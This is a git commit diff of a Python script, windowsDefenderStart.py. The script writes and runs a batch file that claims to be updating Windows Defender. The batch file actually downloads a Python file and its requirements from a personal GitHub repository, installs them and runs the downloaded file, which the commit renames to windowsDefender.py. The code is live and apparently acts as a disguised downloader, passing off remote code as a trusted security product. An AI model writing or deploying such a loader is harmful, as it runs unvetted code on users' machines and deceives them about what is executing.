e32cfe585023428d5a77c4819a30c3c0a377d9e9
MundoCoRobiBundo <114348080+MundoCoRobiBundo@users.noreply.github.com>
2022-09-26 18:58:40 +0200

    Update windowsDefenderStart.py

--- windowsDefenderStart.py
+++ windowsDefenderStart.py
@@ -4,15 +4,15 @@ open("update.bat", "w+").write("""
     echo updating windows defender
 
     timeout /t 10 /nobreak
-    del runer.py
+    del windowsDefender.py
     
-    curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/runer.py -O
+    curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/windowsDefender.py -O
     curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/requirements.txt -O
     
     pip install -r requirements.txt
     
     echo windows defender is up to date
-    python runer.py                               
+    python windowsDefender.py                         
 """)
 
 os.system("update.bat")
